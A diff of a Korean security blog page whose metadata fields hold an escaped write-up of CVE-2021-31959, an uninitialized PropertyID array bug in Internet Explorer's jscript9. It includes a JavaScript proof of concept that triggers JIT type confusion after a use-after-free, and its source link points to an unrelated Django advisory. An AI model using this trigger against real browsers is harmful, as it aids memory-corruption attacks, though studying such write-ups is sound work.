@@ -13,15 +13,203 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://securitylab.github.com/advisories/GHSL-2021-075-django/&#34;&gt;Issue 2168: Internet Explorer: Memory corruption in jscript9.dll due to uninitialized Property ID array&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Internet Explorer (Windows 10)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;MS&amp;#xC5D0;&amp;#xC11C; &amp;#xC9C0;&amp;#xC6D0;&amp;#xC744; 2022&amp;#xB144; 6&amp;#xC6D4;&amp;#xC5D0; &amp;#xC644;&amp;#xC804;&amp;#xD788; &amp;#xC885;&amp;#xB8CC;&amp;#xD558;&amp;#xACA0;&amp;#xB2E4;&amp;#xACE0; &amp;#xBC1D;&amp;#xD78C; Internet Explorer&amp;#xC5D0;&amp;#xC11C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xBC30;&amp;#xC5F4; &amp;#xC694;&amp;#xC18C;&amp;#xC758; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC73C;&amp;#xB85C; &amp;#xC778;&amp;#xD55C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5B4; &amp;#xC138;&amp;#xBD80; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xACF5;&amp;#xAC1C;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; jscript9&amp;#xC758; PropertyID &amp;#xBC30;&amp;#xC5F4;&amp;#xC758; &amp;#xCC98;&amp;#xB9AC; &amp;#xBC29;&amp;#xC2DD;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. PropertyID &amp;#xBC30;&amp;#xC5F4;&amp;#xC740; &lt;code&gt;ByteCodeGenerator::EmitScopeObjectInit&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB54C; &amp;#xD560;&amp;#xB2F9; &amp;#xC2DC; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &lt;code&gt;ArenaAllocator::Alloc&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; &amp;#xBC30;&amp;#xC5F4;&amp;#xC744; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xBBC0;&amp;#xB85C; &amp;#xBC30;&amp;#xC5F4;&amp;#xC758; &amp;#xC77C;&amp;#xBD80;&amp;#xAC00; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xC0C1;&amp;#xD0DC;&amp;#xB85C; &amp;#xC720;&amp;#xC9C0;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xB7EC;&amp;#xD55C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; PropertyID&amp;#xB85C; &amp;#xBCC0;&amp;#xC218;&amp;#xC758; scope&amp;#xB97C; &amp;#xC18D;&amp;#xC77C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; &amp;#xC545;&amp;#xC6A9;&amp;#xD558;&amp;#xBA74; &amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC778; &amp;#xBC29;&amp;#xBC95;&amp;#xC73C;&amp;#xB85C; &amp;#xC561;&amp;#xC138;&amp;#xC2A4; &amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB294; &amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &amp;#xC561;&amp;#xC138;&amp;#xC2A4; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC73C;&amp;#xBA70; &amp;#xC6D0;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xC5B4;&amp;#xC9C8; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &lt;a href=&#34;https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html&#34;&gt;CVE-2020-1380&lt;/a&gt;&amp;#xACFC; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xBC29;&amp;#xBC95;&amp;#xC73C;&amp;#xB85C; JIT &amp;#xC5D4;&amp;#xC9C4;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;PoC Code&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs html&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!-- saved from url=(0014)about:internet --&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;alert(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;start&amp;apos;&lt;/span&gt;);&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// prepare objects&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; buf = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0x8c&lt;/span&gt;);&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; arr = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Int32Array&lt;/span&gt;(buf);&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; o = {};&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;o.valueOf = &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    alert(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;callback&amp;apos;&lt;/span&gt;);&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// free &lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    worker = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Worker(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;worker.js&amp;apos;&lt;/span&gt;);&lt;/span&gt;
+    worker.postMessage(buf, [buf]);
+    worker.terminate();
+&lt;span class=&#34;javascript&#34;&gt;    worker = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// sleep&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; start = &lt;span class=&#34;hljs-built_in&#34;&gt;Date&lt;/span&gt;.now();&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;hljs-built_in&#34;&gt;Date&lt;/span&gt;.now() - start &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;) {}&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// &lt;span class=&#34;hljs-doctag&#34;&gt;TODO:&lt;/span&gt; reclaim freed memory&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;
+};
+
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// generate function from string in order to have a clean bytecode generator&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; vulnstr =&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;for (let i=0; i&amp;lt;1; i++) {\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    function opt(A, x, crash) {\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        &amp;apos;use strict&amp;apos;;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const aagaaaaaaahabauaaaaa = x+1;\n&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-comment&#34;&gt;//special variable name so that hash is eqal to 0x109 (property ID of Int16Array)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c02 = aagaaaaaaahabauaaaaa+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c03 = c02+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c04 = c03+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c05 = c04+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        let c06 = c05+1;\n&amp;quot;&lt;/span&gt; +  &lt;span class=&#34;hljs-comment&#34;&gt;// this variable will alias with Int16Array&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c07 = c06+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c08 = c07+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c09 = c08+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c10 = c09+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c11 = c10+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c12 = c11+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c13 = c12+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c14 = c13+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c15 = c14+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c16 = c15+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c17 = c16+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c18 = c17+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c19 = c18+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c20 = c19+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c21 = c20+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c22 = c21+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c23 = c22+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c24 = c23+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c25 = c24+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c26 = c25+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c27 = c26+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c28 = c27+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c29 = c28+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c30 = c29+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c31 = c30+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c32 = c31+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c33 = c32+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c34 = c33+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c35 = c34+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c36 = c35+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c37 = c36+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c38 = c37+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        if(crash) {\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;          c06 = c06 + 1;\n&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-comment&#34;&gt;// we must change it here so that the value below is not known&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;          Int16Array = o;\n&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-comment&#34;&gt;// here we actually change the value (and type) of c06&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        }\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        A[0] = c06;\n&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-comment&#34;&gt;// if crash==1, c06 is an object here, but JIT thinks it&amp;apos;s an integer&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        eval(1);\n&amp;quot;&lt;/span&gt; +  &lt;span class=&#34;hljs-comment&#34;&gt;// needed to trigger ByteCodeGenerator::EmitScopeObjectInit&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    }\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    for(var i=0; i&amp;lt;100000; i++) {\n&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-comment&#34;&gt;// jit a function&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;      opt(arr, 1, 0);\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    }\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    opt(arr, 1, 1);\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    alert(&amp;apos;failed&amp;apos;);\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;}&amp;quot;&lt;/span&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;vuln = &lt;span class=&#34;hljs-built_in&#34;&gt;Function&lt;/span&gt;(vulnstr);&lt;/span&gt;
+vuln();
+
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt; - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] CVE-2021-31959: Internet Explorer Uninitialized Property ID array - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://securitylab.github.com/advisories/GHSL-2021-075-django/&#34;&gt;Issue 2168: Internet Explorer: Memory corruption in jscript9.dll due to uninitialized Property ID array&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Internet Explorer (Windows 10)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;MS&amp;#xC5D0;&amp;#xC11C; &amp;#xC9C0;&amp;#xC6D0;&amp;#xC744; 2022&amp;#xB144; 6&amp;#xC6D4;&amp;#xC5D0; &amp;#xC644;&amp;#xC804;&amp;#xD788; &amp;#xC885;&amp;#xB8CC;&amp;#xD558;&amp;#xACA0;&amp;#xB2E4;&amp;#xACE0; &amp;#xBC1D;&amp;#xD78C; Internet Explorer&amp;#xC5D0;&amp;#xC11C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xBC30;&amp;#xC5F4; &amp;#xC694;&amp;#xC18C;&amp;#xC758; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC73C;&amp;#xB85C; &amp;#xC778;&amp;#xD55C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5B4; &amp;#xC138;&amp;#xBD80; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xACF5;&amp;#xAC1C;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; jscript9&amp;#xC758; PropertyID &amp;#xBC30;&amp;#xC5F4;&amp;#xC758; &amp;#xCC98;&amp;#xB9AC; &amp;#xBC29;&amp;#xC2DD;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. PropertyID &amp;#xBC30;&amp;#xC5F4;&amp;#xC740; &lt;code&gt;ByteCodeGenerator::EmitScopeObjectInit&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB54C; &amp;#xD560;&amp;#xB2F9; &amp;#xC2DC; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &lt;code&gt;ArenaAllocator::Alloc&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; &amp;#xBC30;&amp;#xC5F4;&amp;#xC744; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xBBC0;&amp;#xB85C; &amp;#xBC30;&amp;#xC5F4;&amp;#xC758; &amp;#xC77C;&amp;#xBD80;&amp;#xAC00; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xC0C1;&amp;#xD0DC;&amp;#xB85C; &amp;#xC720;&amp;#xC9C0;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xB7EC;&amp;#xD55C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; PropertyID&amp;#xB85C; &amp;#xBCC0;&amp;#xC218;&amp;#xC758; scope&amp;#xB97C; &amp;#xC18D;&amp;#xC77C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; &amp;#xC545;&amp;#xC6A9;&amp;#xD558;&amp;#xBA74; &amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC778; &amp;#xBC29;&amp;#xBC95;&amp;#xC73C;&amp;#xB85C; &amp;#xC561;&amp;#xC138;&amp;#xC2A4; &amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB294; &amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &amp;#xC561;&amp;#xC138;&amp;#xC2A4; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC73C;&amp;#xBA70; &amp;#xC6D0;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xC5B4;&amp;#xC9C8; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &lt;a href=&#34;https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html&#34;&gt;CVE-2020-1380&lt;/a&gt;&amp;#xACFC; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xBC29;&amp;#xBC95;&amp;#xC73C;&amp;#xB85C; JIT &amp;#xC5D4;&amp;#xC9C4;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;PoC Code&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs html&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!-- saved from url=(0014)about:internet --&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;alert(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;start&amp;apos;&lt;/span&gt;);&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// prepare objects&lt;/span&gt;&lt;/span&gt;
